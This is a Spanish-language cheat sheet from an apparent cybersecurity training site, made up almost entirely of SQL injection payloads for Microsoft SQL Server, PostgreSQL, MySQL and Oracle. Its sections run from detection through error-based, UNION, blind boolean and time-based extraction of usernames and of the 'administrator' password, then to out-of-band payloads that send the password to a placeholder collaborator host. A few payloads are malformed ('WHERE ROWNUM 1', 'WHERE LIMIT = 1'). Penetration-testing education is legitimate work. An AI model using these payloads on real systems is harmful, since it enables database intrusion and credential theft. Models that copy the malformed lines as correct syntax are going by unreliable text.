---
title: Inyecciones SQL
description: Resumen rápido de comandos esenciales para realizar inyecciones SQL.
layout: academia_lesson
parent: /academia/ciberseguridad/cheatsheets/auditorias-web/documentacion/
author: ElStitchMalo
date: 16/12/2025
updated:
tags: [inyecciones SQL]
---

## Detectar inyecciones SQL

~~~
"
''
'
' --
' /*
' #
' or 1=1 --
' or 1=1 /*
' or 1=1 #
~~~

## Inyecciones SQL en banda - Basadas en errores

### Detectar inyecciones basadas en errores

~~~ 
# Microsoft

' AND CAST((SELECT 1) AS INT) --

' AND 1=CAST((SELECT 1) AS INT) --
~~~
~~~ 
# PostgreSQL

' AND CAST((SELECT 1) AS INTEGER) --

' AND 1=CAST((SELECT 1) AS INTEGER) --
~~~
~~~ 
# MySQL

' AND CAST((SELECT 1) AS SIGNED) #

' AND 1=CAST((SELECT 1) AS SIGNED) #
~~~
~~~ 
# Oracle

' AND CAST((SELECT 1 FROM DUAL) AS NUMBER) --

' AND 1=CAST((SELECT 1 FROM DUAL) AS NUMBER) --
~~~

### Extraer usuario

~~~ 
# Microsoft

' AND 1=CAST((SELECT TOP 1 username FROM users) AS INT) --
~~~
~~~
# PostgreSQL

' AND 1=CAST((SELECT username FROM users LIMIT 1) AS INTEGER) --
~~~
~~~ 
# MySQL

' AND 1=CAST((SELECT username FROM users LIMIT 1) AS SIGNED) #
~~~
~~~ 
# Oracle

' AND 1=CAST((SELECT username FROM users WHERE ROWNUM=1) AS NUMBER) --
~~~

### Extraer contraseña de usuario

~~~ 
# Microsoft

' AND 1=CAST((SELECT TOP 1 password FROM users) AS INT) --
~~~
~~~
# PostgreSQL

' AND 1=CAST((SELECT password FROM users LIMIT 1) AS INTEGER) --
~~~
~~~ 
# MySQL

' AND 1=CAST((SELECT password FROM users LIMIT 1) AS SIGNED) #
~~~
~~~ 
# Oracle

' AND 1=CAST((SELECT password FROM users WHERE ROWNUM=1) AS NUMBER) --
~~~

## Inyecciones SQL en banda - Basadas en UNION SELECT

### Determinar numero de columnas con ORDER BY

~~~ 
# Oracle, Microsoft, PostgreSQL

' ORDER BY 1 --
~~~

~~~ 
# MySQL

' ORDER BY 2 #
~~~

### Determinar numero de columnas con UNION SELECT NULL

~~~ 
# Microsoft, PostgreSQL

' UNION SELECT NULL --
~~~
~~~ 
# MySQL

' UNION SELECT NULL,NULL #
~~~
~~~ 
# Oracle

' UNION SELECT NULL,NULL,NULL FROM DUAL --
~~~

### Encontrar columnas con un tipo de datos útil

~~~ 
# Microsoft, PostgreSQL

' UNION SELECT 'a' --
~~~
~~~ 
# MySQL

' UNION SELECT NULL,'a' #
~~~
~~~ 
# Oracle

' UNION SELECT NULL,NULL,'a' FROM DUAL --
~~~

### Recuperar el contenido de una tabla (users)

~~~ 
# Microsoft, PostgreSQL, Oracle

' UNION SELECT username,password FROM users --
~~~
~~~ 
# MySQL

' UNION SELECT username,password FROM users #
~~~

### Consultar tipo y versión de la base de datos

~~~ 
# Microsoft

' UNION SELECT @@version --

' UNION SELECT NULL,@@version --
~~~
~~~ 
# MySQL

' UNION SELECT @@version #

' UNION SELECT NULL,@@version #
~~~
~~~ 
# Oracle

' UNION SELECT BANNER FROM v$version --

' UNION SELECT NULL,BANNER_FULL FROM v$version --
~~~
~~~ 
# PostgreSQL

' UNION SELECT version() --

' UNION SELECT NULL,version() --
~~~

### Extraer información sobre el contenido de la base de datos

#### Tablas

~~~ 
# Microsoft, PostgreSQL

' UNION SELECT table_name,NULL FROM information_schema.tables --
~~~
~~~ 
# MySQL

' UNION SELECT table_name,NULL FROM information_schema.tables #
~~~
~~~ 
# Oracle

' UNION SELECT table_name,NULL FROM all_tables --
~~~

#### Columnas

~~~ 
# Microsoft, PostgreSQL

' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name = 'users' --
~~~
~~~ 
# MySQL

' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name = 'users' #
~~~
~~~ 
# Oracle

' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name = 'users' --
~~~

#### Datos

~~~ 
# Microsoft, PostgreSQL, Oracle

' UNION SELECT username,password FROM users --
~~~
~~~ 
# MySQL

' UNION SELECT username,password FROM users #
~~~

### Recuperar múltiples valores dentro de una sola columna

~~~ 
# Oracle, PostgreSQL

' UNION SELECT username || '~' || password FROM users --
~~~

~~~ 
# Microsoft

' UNION SELECT NULL,username + '~' + password FROM users --
~~~

~~~ 
# MySQL

' UNION SELECT NULL,NULL,CONCAT(username, '~', password) FROM users #
~~~

## Inyecciones SQL ciegas - Basadas en condicionales

### Detectar inyecciones condicionales

~~~
' AND '1'='1
' AND '1'='2
' AND '1'='1' --
' AND '1'='2' --
' AND '1'='1' /*
' AND '1'='2' /*
' AND '1'='1' #
' AND '1'='2' #
~~~

### Verificar que existe la tabla en la base de datos y tiene al menos una fila (users)

~~~ 
# PostgreSQL

' AND (SELECT 'a' FROM users LIMIT 1)='a

' AND (SELECT 'a' FROM users LIMIT 1)='a' --
~~~
~~~
# Microsoft

' AND (SELECT TOP 1 'a' FROM users) = 'a

' AND (SELECT TOP 1 'a' FROM users) = 'a' -- 
~~~
~~~
# MySQL

' AND (SELECT 'a' FROM users LIMIT 1)='a

' AND (SELECT 'a' FROM users LIMIT 1)='a' #
~~~
~~~ 
# Oracle

' AND (SELECT 'a' FROM users WHERE ROWNUM 1)='a

' AND (SELECT 'a' FROM users WHERE ROWNUM 1)='a' --
~~~

### Verificar que existe el usuario en la base de datos (administrator)

~~~
# PostgreSQL, MySQL, Microsoft, Oracle

' AND (SELECT 'a' FROM users WHERE username='administrator')='a

' AND EXISTS(SELECT 1 FROM users WHERE username = 'administrator') -- 
~~~

### Determinar cuantos caracteres tiene la contraseña del usuario (administrator)

~~~
# MySQL

' AND (SELECT 'a' FROM users WHERE username = 'administrator' AND CHAR_LENGTH(password) = 1 LIMIT 1) = 'a

' AND (SELECT 'a' FROM users WHERE username = 'administrator' AND CHAR_LENGTH(password) = 1 LIMIT 1) = 'a' -- 
~~~
~~~
# PostgreSQL

' AND (SELECT 'a' FROM users WHERE username = 'administrator' AND LENGTH(password)=1)='a

' AND (SELECT 'a' FROM users WHERE username = 'administrator' AND LENGTH(password) = 1 LIMIT 1) = 'a' -- 
~~~
~~~
# Microsoft

' AND (SELECT TOP 1 'a' FROM users WHERE username = 'administrator' AND LEN(password) = 1) = 'a

' AND (SELECT TOP 1 'a' FROM users WHERE username = 'administrator' AND LEN(password) = 1) = 'a' -- 
~~~
~~~
# Oracle

' AND (SELECT 'a' FROM users WHERE username = 'administrator' AND LENGTH(password) = 1 AND ROWNUM = 1) = 'a

' AND (SELECT 'a' FROM users WHERE username = 'administrator' AND LENGTH(password) = 1 AND ROWNUM = 1) = 'a' -- 
~~~

### Extraer contraseña de usuario caracter a caracter

~~~
# PostgreSQL

' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a

' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 1) = 'a

' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator' LIMIT 1), 1, 1) = 'a' -- 

' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator' LIMIT 1) FROM 1 FOR 1) = 'a' -- 
~~~
~~~
# MySQL

' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a

' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 1) = 'a

' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator' LIMIT 1), 1, 1) = 'a' # 
~~~
~~~
# Microsoft

' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a

' AND SUBSTRING((SELECT TOP 1 password FROM users WHERE username = 'administrator'), 1, 1) = 'a

' AND SUBSTRING((SELECT TOP 1 password FROM users WHERE username = 'administrator'), 1, 1) = 'a' -- 
~~~
~~~
# Oracle

' AND SUBSTR((SELECT password FROM users WHERE username = 'administrator' AND ROWNUM = 1), 1, 1) = 'a

' AND SUBSTR((SELECT password FROM users WHERE username = 'administrator' AND ROWNUM = 1), 1, 1) = 'a' -- 

' AND SUBSTR((SELECT password FROM users WHERE username = 'administrator' FETCH FIRST 1 ROWS ONLY), 1, 1) = 'a' -- 
~~~

## Inyecciones SQL ciegas - Basadas en errores condicionales

### Detectar inyecciones mediante errores condicionales

~~~
# PostgreSQL, MySQL, Microsoft

'||(SELECT '')||'
~~~
~~~
# Oracle

'||(SELECT '' FROM DUAL)||'
~~~
~~~
# PostgreSQL, MySQL, Microsoft, Oracle 

'||(SELECT '' FROM not-a-real-table)||'
~~~
~~~
# PostgreSQL, MySQL, Microsoft

' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a

' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
~~~
~~~ 
# Microsoft

' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE NULL END)

' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE NULL END)
~~~
~~~ 
# PostgreSQL

' AND 1=(SELECT CASE WHEN (1=1) THEN 1/(SELECT 0) ELSE NULL END)

' AND 1=(SELECT CASE WHEN (1=2) THEN 1/(SELECT 0) ELSE NULL END)
~~~
~~~ 
# MySQL

' AND SELECT IF(1=1,(SELECT table_name FROM information_schema.tables),'a')

' AND SELECT IF(1=2,(SELECT table_name FROM information_schema.tables),'a')
~~~
~~~ 
# Oracle

' AND (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END FROM DUAL)

' AND (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE NULL END FROM DUAL)

' ||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'

' ||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
~~~

### Verificar que existe la tabla en la base de datos y tiene al menos una fila (users)

~~~ 
# Microsoft, PostgreSQL, MySQL

' ||(SELECT '' FROM users WHERE LIMIT = 1)||'
~~~
~~~ 
# Oracle

' ||(SELECT '' FROM users WHERE ROWNUM = 1)||'
~~~

### Verificar que existe el usuario en la base de datos (administrator)

~~~
# Oracle

' ||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
~~~

### Determinar cuantos caracteres tiene la contraseña del usuario (administrator)

~~~
# Oracle

' ||(SELECT CASE WHEN LENGTH(password)=1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'
~~~

### Extraer contraseña de usuario caracter a caracter

~~~
# Oracle

'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
~~~
~~~
# PostgreSQL, MySQL, Microsoft

' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) = 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
~~~

## Inyecciones SQL ciegas - Basadas en tiempo

### Detectar inyecciones ciegas basadas en tiempo

~~~ 
# Microsoft

'; IF (1=1) WAITFOR DELAY '0:0:10' --

'; IF (1=2) WAITFOR DELAY '0:0:10' --
~~~
~~~ 
# Oracle

'; SELECT CASE WHEN (1=1) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual --

'; SELECT CASE WHEN (1=2) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual --
~~~
~~~ 
# PostgreSQL

'; SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END --

'; SELECT CASE WHEN (1=2) THEN pg_sleep(10) ELSE pg_sleep(0) END --

' ||pg_sleep(10) --
~~~
~~~ 
# MySQL

'; SELECT IF(1=1,SLEEP(10),'a') #

'; SELECT IF(1=2,SLEEP(10),'a') #
~~~

### Verificar que existe la tabla en la base de datos y tiene al menos una fila (users)

~~~ 
# PostgreSQL

'; SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users LIMIT 1 -- 
~~~

### Verificar que existe el usuario en la base de datos (administrator)

~~~ 
# PostgreSQL

'; AND (SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username = 'administrator' LIMIT 1) IS NULL --

'; SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users --
~~~

### Determinar cuantos caracteres tiene la contraseña del usuario (administrator)

~~~ 
# PostgreSQL

'; SELECT CASE WHEN LENGTH(password)=20 THEN pg_sleep(10) ELSE pg_sleep(0) END
  FROM users WHERE username = 'administrator' --

'; SELECT CASE WHEN (username='administrator' AND LENGTH(password)=1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users --
~~~

### Extraer contraseña de usuario caracter a caracter

~~~ 
# Microsoft

'; IF (SELECT COUNT(username) FROM users WHERE username = 'administrator' AND SUBSTRING(password, 1, 1) = 'm') = 1 WAITFOR DELAY '0:0:10' --
~~~
~~~ 
# Oracle

' AND (SELECT CASE WHEN SUBSTR(password,1,1) = 'm' THEN DBMS_LOCK.SLEEP(10) ELSE NULL END
   FROM users WHERE username = 'administrator' AND ROWNUM = 1) IS NULL --
~~~
~~~ 
# PostgreSQL

' AND (SELECT CASE WHEN SUBSTRING(password FROM 1 FOR 1) = 'm' THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username = 'administrator' LIMIT 1) IS NULL --

'; SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users --
~~~
~~~ 
# MySQL

' AND IF((SELECT SUBSTRING(password,1,1) FROM users WHERE username = 'administrator' LIMIT 1) = 'm', SLEEP(10), 0) #
~~~

## Inyecciones SQL fuera de banda - OAST

### Detectar inyecciones fuera de banda OAST

~~~
# Microsoft

' exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a' --

'+exec+master..xp_dirtree+'//BURP-COLLABORATOR-SUBDOMAIN/a'+--

'; exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a' --

'%3b+exec+master..xp_dirtree+'//BURP-COLLABORATOR-SUBDOMAIN/a'+--
~~~
~~~
# Oracle

' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual --

'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual+--

' UNION SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN') --

'+UNION+SELECT+UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')+--
~~~
~~~
# PostgreSQL

' copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN' --

'+copy+(SELECT+'')+to+program+'nslookup+BURP-COLLABORATOR-SUBDOMAIN'+--

'; copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN' --

'%3b+copy+(SELECT+'')+to+program+'nslookup+BURP-COLLABORATOR-SUBDOMAIN'+--
~~~
~~~
#MySQL

' LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a') # 

'+LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')+#

'; LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a') # 

'%3b+LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')+#+

' UNION SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a' #

'+UNION+SELECT+...+INTO+OUTFILE+'\\\\BURP-COLLABORATOR-SUBDOMAIN\a'+#

'; UNION SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a' #

'%3b+UNION+SELECT+...+INTO+OUTFILE+'\\\\BURP-COLLABORATOR-SUBDOMAIN\a'+#
~~~

### Exfiltrar datos

~~~
# Microsoft

' declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='administrator');exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"') --

'+declare+@p+varchar(1024)%3bset+@p%3d(SELECT+password+FROM+users+WHERE+username%3d'administrator')%3bexec('master..xp_dirtree+"//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')+--
~~~
~~~
# Oracle

' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual --

'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual+--
~~~
~~~
# PostgreSQL

' create OR replace function f() returns void as $$ declare c text;declare p text;begin SELECT into p (SELECT password FROM users WHERE username='administrator');c := 'copy (SELECT '''') to program ''nslookup '||p||' BURP-COLLABORATOR-SUBDOMAIN''';execute c;END;$$ language plpgsql security definer;SELECT f(); --

'+create+OR+replace+function+f()+returns+void+as+$$+declare+c+text%3bdeclare+p+text%3bbegin+SELECT+into+p+(SELECT+password+FROM+users+WHERE+username%3d'administrator')%3bc+%3a%3d+'copy+(SELECT+'''')+to+program+''nslookup+'||p||'+BURP-COLLABORATOR-SUBDOMAIN'''%3bexecute+c%3bEND%3b$$+language+plpgsql+security+definer%3bSELECT+f()%3b+--
~~~
~~~
# MySQL

' UNION SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a' #

'+UNION+SELECT+YOUR-QUERY-HERE+INTO+OUTFILE+'\\\\BURP-COLLABORATOR-SUBDOMAIN\a'+#
~~~

### Encodear payloads

En CyberChef configurar los siguientes `Find/Replace`:

~~~
  -> +
% -> %25
? -> %3f
= -> %3d
: -> %3a
; -> %3b
~~~
